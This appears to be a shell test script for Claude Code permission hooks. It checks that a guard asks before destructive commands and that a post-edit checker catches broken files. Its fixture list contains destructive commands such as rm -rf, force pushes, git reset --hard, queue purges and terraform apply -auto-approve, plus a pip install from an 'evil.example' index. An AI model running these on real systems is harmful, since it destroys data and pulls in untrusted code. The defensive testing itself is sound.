#!/usr/bin/env bash
# Fixture tests for the hooks in this directory: feed canned hook JSON, assert the decision.
# Run after ANY change to .claude/hooks/ or .claude/settings.json:  .claude/hooks/test-hooks.sh
# Ported from enrichmeai/valuedocs (2026-09-26), whose "ask" cases were each first seen passing
# added here with the port.
set -uo pipefail
here=$(cd "$(dirname "$0")" && pwd)
fail=0; n=0

guard() { # $1 = command, $2 = cwd (optional) -> prints "ask" or "pass"
  local out
  out=$(jq -n --arg c "$1" --arg d "${2:-$PWD}" '{tool_input:{command:$c}, cwd:$d}' | "$here/guard-destructive.sh")
  [ "$(jq -r '.hookSpecificOutput.permissionDecision // empty' <<<"$out" 2>/dev/null)" = "ask" ] && echo ask || echo pass
}
expect() { # $1 = expected, $2 = actual, $3 = label
  n=$((n+1)); if [ "$1" != "$2" ]; then echo "FAIL: expected $1, got $2 — $3"; fail=1; fi
}

# A scratch repo on a feature branch, so "push while on main" depends only on the command.
tmp=$(mktemp -d); trap 'rm -rf "$tmp"' EXIT
git -C "$tmp" init -q -b feature 2>/dev/null || { git -C "$tmp" init -q && git -C "$tmp" checkout -q -b feature; }
git -C "$tmp" -c user.email=t@t -c user.name=t commit -q --allow-empty -m init

while IFS='|' read -r want cmd; do
  [ -z "$want" ] || [ "${want:0:1}" = "#" ] && continue
  expect "$want" "$(guard "$cmd" "$tmp")" "$cmd"
done <<'CASES'
# --- git ---
ask|git push --force origin feat
ask|git -C . push -f origin feat
ask|git push origin +feat
ask|git push --force-with-lease=feat:abc origin feat
ask|git push origin main
ask|git push origin HEAD:main
ask|git push origin --delete feat
ask|git push --tags
ask|cd x && git reset --hard origin/main
ask|git clean -fd
ask|git checkout -- .
ask|git tag v0.3.0
ask|git tag -d v0.1.0
ask|git tag -a java-0.3.0 -m x
# --- deletes ---
ask|rm -rf build
ask|rm -fr /tmp/x
ask|rm -r /tmp/x
ask|rm -R dir
ask|rm --recursive dir
# --- cloud ---
ask|aws s3 ls
ask|/usr/local/bin/aws sqs purge-queue --queue-url x
ask|terraform -chdir=infrastructure/terraform apply
ask|terraform apply -auto-approve
ask|gcloud dataflow flex-template run x
ask|/usr/bin/gcloud projects list
ask|env gcloud config list
ask|bq rm -t ds.t
ask|gsutil rm gs://b/o
ask|kubectl apply -f x.yaml
ask|helm upgrade --install airflow infrastructure/k8s/charts/airflow
# --- publishing and releases ---
ask|mvn -B deploy
ask|cd test-core && mvn -B -Prelease deploy
ask|mvn -Prelease verify
ask|gh release create v0.3.0
ask|gh pr merge 201 --squash
ask|gh workflow run deploy-generic.yml
ask|gh workflow enable ci.yml
ask|gh api -X DELETE repos/x/y/git/refs/heads/z
ask|gh api repos/x/y/issues --method POST -f t=x
ask|pip install -e git+https://example.com/x.git#egg=x
ask|pip install --index-url https://evil.example/simple x
# --- must stay silent ---
pass|git push -u origin claude/some-task
pass|mvn -B -q -pl test-core -am spotless:check test-compile
pass|mvn -B verify
pass|mvn spotless:apply
pass|grep -rn "awsRegion" test-cloud-aws
pass|git push
pass|git push origin feature-main-thing
pass|git status
pass|git tag
pass|git tag -l
pass|git tag --list 'v*'
pass|git checkout -b feat origin/main
pass|git commit -m "feat: deployment docs for deploy-generic"
pass|mvn -B -q -pl test-core -am test-compile
pass|mvn -B -pl test-cloud-aws -am test -Dtest=AwsBlobStorageTest
pass|mvn -f deployments/reference-e2e-gcp/pom.xml test
pass|mvn -Pintegration-docs site
pass|rm build/tmp.txt
pass|rm -f build/tmp.txt
pass|terraform plan
pass|helm template x infrastructure/k8s/charts/airflow
pass|gh pr view 12
pass|gh api repos/x/y/pulls
pass|grep -rn "terraform" docs
CASES

# Bare `git push` while the current branch IS main.
git -C "$tmp" checkout -q -b main 2>/dev/null || git -C "$tmp" checkout -q main
expect ask "$(guard 'git push' "$tmp")" 'git push (on main)'
expect ask "$(guard 'git push origin' "$tmp")" 'git push origin (on main)'

# post-edit-check: exit 2 on broken JSON/Python/YAML/pom, 0 on good, 0 for files outside its scope.
# Fixtures live outside the scratch repo, so the Stop-hook cases below see only their own files.
ptmp=$(mktemp -d); trap 'rm -rf "$tmp" "$ptmp"' EXIT
pe() { jq -n --arg f "$1" '{tool_input:{file_path:$f}}' | CLAUDE_PROJECT_DIR="$ptmp" "$here/post-edit-check.sh" >/dev/null 2>&1; echo $?; }
printf '{"a":1}' > "$ptmp/good.json"; printf '{"a":' > "$ptmp/bad.json"
printf 'x = 1\n' > "$ptmp/good.py"; printf 'def f(:\n' > "$ptmp/bad.py"
printf '<project></project>\n' > "$ptmp/pom.xml"; mkdir -p "$ptmp/m"; printf '<project>\n' > "$ptmp/m/pom.xml"
mkdir -p "$ptmp/dir with space"; printf '{"a":' > "$ptmp/dir with space/bad.json"
mkdir -p "$ptmp/chart/templates"; printf '{{ .Values.x }}: [\n' > "$ptmp/chart/templates/x.yaml"
expect 0 "$(pe "$ptmp/good.json")" 'post-edit good.json'
expect 2 "$(pe "$ptmp/bad.json")" 'post-edit bad.json'
expect 0 "$(pe "$ptmp/good.py")" 'post-edit good.py'
expect 2 "$(pe "$ptmp/bad.py")" 'post-edit bad.py'
expect 0 "$(pe "$ptmp/pom.xml")" 'post-edit good pom.xml'
expect 2 "$(pe "$ptmp/m/pom.xml")" 'post-edit bad pom.xml'
expect 0 "$(pe "$ptmp/chart/templates/x.yaml")" 'post-edit helm template is not YAML'
expect 2 "$(pe "$ptmp/dir with space/bad.json")" 'post-edit path with spaces'
expect 0 "$(pe "$ptmp/missing.json")" 'post-edit deleted file'
expect 0 "$(pe "")" 'post-edit no file_path'
if python3 -c 'import yaml' 2>/dev/null; then
  printf 'a: [\n' > "$ptmp/bad.yml"
  expect 2 "$(pe "$ptmp/bad.yml")" 'post-edit bad.yml'
fi

# stop-fast-gates: no origin/main and nothing to check -> allow the stop silently.
out=$(echo '{"stop_hook_active":false}' | (cd "$tmp" && CLAUDE_PROJECT_DIR="$tmp" "$here/stop-fast-gates.sh")); rc=$?
expect "0:" "$rc:$out" 'stop hook with nothing to check'


echo "hook tests: $n run, $([ $fail = 0 ] && echo 'all passed' || echo 'FAILURES above')"
exit $fail
